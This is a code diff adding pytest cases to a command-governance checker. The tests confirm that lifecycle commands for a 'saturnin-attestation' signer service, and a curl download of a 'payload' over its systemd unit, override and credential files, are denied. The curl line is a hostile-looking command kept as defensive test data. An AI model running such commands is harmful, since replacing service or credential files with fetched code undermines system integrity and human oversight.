@@ -1340,6 +1340,45 @@ def test_in_scope_server_commands(
     assert governance.check_server_command(command).allowed
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "systemctl --user start saturnin-attestation.service",
+        "systemctl --user stop saturnin-attestation.service",
+        "systemctl --user restart saturnin-attestation.service",
+        "systemctl --user enable saturnin-attestation.service",
+        "systemctl --user disable saturnin-attestation.service",
+    ],
+)
+def test_signer_unit_lifecycle_is_reserved_for_governed_operation(
+    governance: Governance, command: str
+) -> None:
+    assert not governance.check_server_command(command).allowed
+
+
+@pytest.mark.parametrize(
+    "relative",
+    [
+        ".config/systemd/user/saturnin-attestation.service",
+        ".config/systemd/user/saturnin-attestation.service.d/override.conf",
+        ".config/systemd/user/saturnin-attestation-runtime.pyz",
+        ".config/systemd/user/default.target.wants/saturnin-attestation.service",
+        ".config/systemd/user/saturnin-credentials/replacement.cred",
+        ".config/systemd/user",
+    ],
+)
+def test_signer_files_are_reserved_for_governed_operation(
+    governance: Governance, relative: str
+) -> None:
+    target = Path.home() / relative
+
+    decision = governance.check_server_command(
+        f"curl -q -o {target} https://example.test/payload"
+    )
+
+    assert not decision.allowed
+
+
 def test_signer_user_unit_operation_is_exact_and_canonical(
     governance: Governance, config: Config
 ) -> None:
